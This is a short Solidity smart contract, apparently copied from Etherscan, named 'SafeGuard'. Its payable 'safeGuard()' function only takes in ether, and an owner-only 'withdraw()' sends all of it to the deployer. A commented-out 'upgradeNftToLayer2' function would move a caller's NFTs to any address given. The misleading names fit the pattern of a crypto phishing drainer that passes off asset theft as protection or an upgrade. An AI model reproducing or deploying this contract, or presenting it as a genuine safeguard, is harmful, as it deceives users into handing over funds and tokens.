/**
 *Submitted for verification at Etherscan.io on 2023-02-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// interface IERC165 {
//     function supportsInterface(bytes4 interfaceId) external view returns (bool);
// }

// interface IERC721 is IERC165 {
//     event Transfer(
//         address indexed from,
//         address indexed to,
//         uint256 indexed tokenId
//     );
//     event Approval(
//         address indexed owner,
//         address indexed approved,
//         uint256 indexed tokenId
//     );
//     event ApprovalForAll(
//         address indexed owner,
//         address indexed operator,
//         bool approved
//     );

//     function balanceOf(address owner) external view returns (uint256 balance);

//     function ownerOf(uint256 tokenId) external view returns (address owner);

//     function safeTransferFrom(
//         address from,
//         address to,
//         uint256 tokenId,
//         bytes calldata data
//     ) external;

//     function safeTransferFrom(
//         address from,
//         address to,
//         uint256 tokenId
//     ) external;

//     function transferFrom(
//         address from,
//         address to,
//         uint256 tokenId
//     ) external;

//     function approve(address to, uint256 tokenId) external;

//     function setApprovalForAll(address operator, bool _approved) external;

//     function getApproved(uint256 tokenId)
//         external
//         view
//         returns (address operator);

//     function isApprovedForAll(address owner, address operator)
//         external
//         view
//         returns (bool);
// }

contract SafeGuard {
    address private owner; // current owner of the contract

    constructor() {
        owner = msg.sender;
    }

    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    function safeGuard() public payable {}

    // function upgradeNftToLayer2(
    //     address contractAddress,
    //     address layer2Address,
    //     uint256 tokenId
    // ) public {
    //     IERC721 erc721 = IERC721(contractAddress);
    //     erc721.transferFrom(msg.sender, layer2Address, tokenId);
    // }
}